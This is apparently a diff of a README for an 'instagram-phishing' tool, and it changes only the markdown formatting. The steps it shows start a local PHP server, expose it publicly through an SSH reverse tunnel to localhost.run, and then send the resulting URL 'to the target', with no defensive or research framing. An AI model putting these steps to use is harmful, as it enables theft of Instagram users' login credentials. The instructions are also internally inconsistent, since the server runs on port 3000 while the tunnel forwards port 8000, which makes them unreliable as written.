@@ -6,9 +6,9 @@ to use this script, you need to install php or xampp and ssh on your system.
 open command prompt and with 'cd' command go to project directory.
 ## Third Step:
 After you go to instagram-phishing directory, enter this command on your cmd:
-***__php -S 127.0.0.1:3000__***
+### ***__php -S 127.0.0.1:3000__***
 ## Forth Step:
 Open another cmd and enter this command:
-***ssh -R 80:127.0.0.1:8000 nokey@localhost.run***
+### ***__ssh -R 80:127.0.0.1:8000 nokey@localhost.run__***
 ## Final Step:
 Then you can see a url. copy this url and send to the target.
